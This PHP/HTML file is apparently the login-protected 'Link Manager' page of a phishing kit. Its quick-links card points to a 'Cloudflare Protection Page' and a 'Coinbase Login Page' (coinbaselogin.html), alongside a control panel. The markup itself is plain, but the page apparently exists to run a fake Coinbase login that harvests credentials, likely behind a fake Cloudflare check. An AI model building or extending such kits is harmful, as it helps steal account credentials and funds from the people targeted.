<?php
require_once 'auth.php';
require_login();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Link Manager</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
</head>
<body>
    <nav>
        <div class="nav-wrapper">
            <a href="#" class="brand-logo">Link Manager</a>
            <ul id="nav-mobile" class="right">
                <li><a href="../panel.php">Control Panel</a></li>
                <li><a href="?logout">Logout</a></li>
            </ul>
        </div>
    </nav>
    
    <div class="container">
        <h4>Link Management</h4>
        <p>This is the link management section.</p>
        
        <div class="card">
            <div class="card-content">
                <h5>Quick Links</h5>
                <div class="collection">
                    <a href="../index.php" target="_blank" class="collection-item">Cloudflare Protection Page</a>
                    <a href="../coinbaselogin.html" target="_blank" class="collection-item">Coinbase Login Page</a>
                    <a href="../panel.php" class="collection-item">Control Panel</a>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
</body>
</html>